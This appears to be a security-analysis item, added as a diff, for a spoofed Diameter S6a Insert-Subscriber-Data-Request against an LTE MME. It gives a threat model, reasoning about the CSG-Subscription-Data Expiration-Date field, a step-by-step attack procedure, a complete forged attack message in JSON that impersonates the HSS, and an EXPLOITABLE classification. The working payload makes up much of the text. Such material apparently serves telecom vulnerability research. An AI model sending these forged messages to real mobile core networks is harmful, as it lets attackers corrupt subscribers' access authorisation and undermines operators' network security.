@@ -1,0 +1,115 @@
+### **Threat Model:**
+- **Attack Assumption:**  
+  The exposed S6a interface of an MME is reachable from the Internet due to misconfiguration. The attacker impersonates the HSS role and sends a forged `Insert-Subscriber-Data-Request` (command code 319, application-id 16777251) to the MME. The MME accepts the request as authoritative subscriber data and processes the included `Subscription-Data`.
+- **Attacker Capability:**  
+  The attacker can send one crafted Diameter Request and passively receive the corresponding Answer.
+
+### **Exploitability Analysis:**
+`Subscription-Data.CSG-Subscription-Data.Expiration-Date` is a real subscriber-provisioning field, not descriptive metadata.
+
+The target AVP is a nested leaf inside the repeated grouped AVP `CSG-Subscription-Data`, and it applies to the specific entry identified by the companion `CSG-Id`. In an accepted `Insert-Subscriber-Data-Request`, the MME stores this value as part of the UE's subscriber context. Its semantics are authoritative: it defines until what time that CSG subscription entry remains valid.
+
+That creates a field-specific state change:
+
+- the MME updates the stored CSG subscription record for the subscriber,
+- specifically the expiration timestamp of the entry selected by `CSG-Id`,
+- and retains that value until later overwrite, context removal, or fresh subscription retrieval.
+
+This is not merely "the message is dangerous in general." The effect is specifically tied to `Expiration-Date`: it changes the temporal validity of an already identified CSG subscription entry. By choosing the timestamp, an attacker can:
+
+- set it to a past time, causing premature expiry of that CSG authorization, or
+- set it far in the future, causing improper continued authorization after legitimate expiry.
+
+The operational consequence is realized later when the MME performs CSG/hybrid-cell access or mobility checks and consults stored CSG subscription data. The scope is narrow but concrete: one subscriber, one chosen `CSG-Subscription-Data` entry, selected by `CSG-Id`. This field does not by itself alter APN configuration, bearer QoS, or general EPS session setup; its impact is specifically CSG authorization timing.
+
+Because the value is stored and later consumed for access-control-related behavior, a single spoofed request can create durable subscriber-profile corruption with standards-grounded downstream effect. That satisfies the one-shot control-point test.
+
+### **Attack Procedure:**
+The attacker crafts a minimal `Insert-Subscriber-Data-Request` containing the mandatory routing/session AVPs, a `User-Name` identifying the target subscriber, `IDR-Flags`, and a `Subscription-Data` grouped AVP with one `CSG-Subscription-Data` entry.
+
+Inside that grouped entry, the attacker includes:
+
+- `CSG-Id` to select the affected subscription record
+- `Expiration-Date` set to a malicious but valid Diameter `Time` value
+
+The attacker sends the request to the target MME. Success means the MME accepts the IDR, stores the forged expiration for that subscriber's selected CSG entry, and later makes CSG access decisions using the attacker-chosen validity time.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "request": true,
+    "command_code": 319,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "fakehss01.example.net;1717660000;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avps": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss01.epc.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "IDR-Flags",
+      "avp_value": 0
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avps": [
+        {
+          "avp_name": "CSG-Subscription-Data",
+          "grouped_avps": [
+            {
+              "avp_name": "CSG-Id",
+              "avp_value": 4242421
+            },
+            {
+              "avp_name": "Expiration-Date",
+              "avp_value": "2000-01-01T00:00:00Z"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
